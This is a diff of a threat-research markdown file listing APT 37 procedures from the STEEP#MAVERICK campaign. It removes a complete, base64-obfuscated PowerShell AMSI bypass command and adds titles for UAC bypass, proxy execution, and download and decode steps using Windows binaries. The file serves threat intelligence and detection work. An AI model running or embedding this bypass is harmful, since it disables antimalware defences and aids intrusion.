@@ -77,10 +77,12 @@ Powershell.exe | 4 | `Execute`
 **TOTAL** | **49** | 
 
 ## APT Prodecural Examples
-### APT 37
-**STEEP#MAVERICK: New Covert Attack Campaign Targeting Military Contractors**
+### **APT 37 -  STEEP#MAVERICK: New Covert Attack Campaign Targeting Military Contractors**
 1. AMSI Bypass via Base64 Encoding
-  `powershell.exe -c "[Ref].Assembly.GetType(''System.Management.Automation.''+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(''QQBtAHMAaQBVAHQAaQBsAHMA'')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(''YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==''))),''NonPublic,Static'').SetValue($null,$true)"`
+2. UAC Bypass via Eventwvr.exe Registry Tampering
+3. Proxy Execution of Eventwvr.msc via Pcalua.exe
+4. Download Encoded Payload `header.png` via Wmic.exe
+5. Decode Final Payload via Certutil.exe
 
 ## To-Do
 - [X] Export Report + JSON
